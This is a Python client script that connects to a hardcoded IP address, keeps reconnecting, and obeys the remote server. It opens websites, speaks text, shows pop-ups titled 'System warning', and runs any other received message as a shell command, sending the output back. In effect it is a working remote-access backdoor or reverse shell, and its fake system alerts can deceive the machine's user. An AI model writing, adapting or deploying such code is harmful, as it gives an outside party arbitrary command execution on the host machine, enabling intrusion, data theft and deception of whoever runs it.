import socket
import webbrowser as wb
import os
import subprocess
import time   # 🔥 add
from plyer import notification
import pyttsx3
HOST = '100.111.190.57'
PORT = 5000

def speak(audio):
    engine = pyttsx3.init("sapi5")
    engine.setProperty("rate",170)
    engine.setProperty("volume",1.0)
    engine.stop()
    engine.say(audio)
    engine.runAndWait()

# 🔥 reconnect loop
while True:
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((HOST, PORT))
        break
    except:
        print("Server not available, retrying...")
        time.sleep(2)

print("Connected to server!")

def send_to_server(msg):
    client.send(msg.encode())

while True:
    try:
        data = client.recv(1024).decode()
    except:
        print("Server disconnected. Reconnecting...")
        client.close()
        time.sleep(2)

        # 🔥 reconnect again
        while True:
            try:
                client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                client.connect((HOST, PORT))
                print("Reconnected!")
                break
            except:
                time.sleep(2)
        continue

    if not data:
        continue

    print(f"Server: {data}")

    if data.startswith("open "):
        try:
            app = data.replace("open ", "").strip()
            wb.open(f"https://{app}.com")
            send_to_server(f"{app} opened")   # 🔥 add this
        except:
            send_to_server("wrong domain name")

    elif data.lower() == "exit":
        break

    if data.startswith("speak "):
        try:
            audio = data.replace("speak ", "").strip()
            speak(audio)
            send_to_server("voice speaked")   # 🔥 add this
        except:
            send_to_server("can't speak voice")
    
    
    elif data.startswith("show alert"):
        try:
            alert = data.replace("show alert ", "").strip()
            notification.notify(
                title="System warning",
                message=f"{alert}",
                timeout = 5
            )
            send_to_server(f"alert showed")   # 🔥 add this
        except:
            send_to_server("can't show the alert")

    else:
        try:
            data = subprocess.check_output(f"{data}", shell=True).decode()
            send_to_server(data)
            send_to_server("task complete")
        except:
           send_to_server(f"{data} command is wrong please give right command")


    

    

client.close()
